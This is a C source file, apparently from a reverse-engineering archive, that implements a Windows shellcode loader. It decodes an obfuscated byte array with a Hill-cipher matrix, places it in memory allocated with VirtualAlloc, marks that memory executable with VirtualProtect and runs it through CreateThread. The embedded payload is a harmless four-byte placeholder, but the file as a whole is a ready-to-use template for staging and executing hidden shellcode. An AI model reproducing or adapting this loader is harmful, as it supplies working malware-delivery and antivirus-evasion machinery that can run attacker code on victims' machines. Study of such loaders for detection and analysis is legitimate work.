/*
    Shellcode Loader
    Archive of Reversing.ID

    Reordering the shellcode with custom algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    Hill Cipher
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

// Hill-Cipher decription with matrix
// [[13,0], [0,37]]
void multiply(uint8_t * dst, uint8_t * src, uint8_t key[2][2]) {
    // iterate row
    for (size_t idx=0; idx<2; idx++) {
        dst[idx] = (key[idx][0]*src[0] + key[idx][1]*src[1]) % 256;
    }
}

// 2x2 matrix as key and array of 2 elements as input
void substitute (uint8_t * dst, uint8_t * src, uint8_t key[2][2], size_t size)
{
    for (size_t idx=0; idx<size; idx+=2) {
        // matrix multiplication
        multiply(&dst[idx], &src[idx], key);
    }
}

#include <stdio.h>
int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    uint8_t key[2][2] = { {13, 0}, {0, 37} };

    // shellcode storage in stack
    uint8_t     payload []  = { 0xd0, 0x50, 0xfc, 0xc7 };
    uint32_t    payload_len = 4;
    uint32_t    idx;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    substitute((uint8_t*)runtime, (uint8_t*)payload, key, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}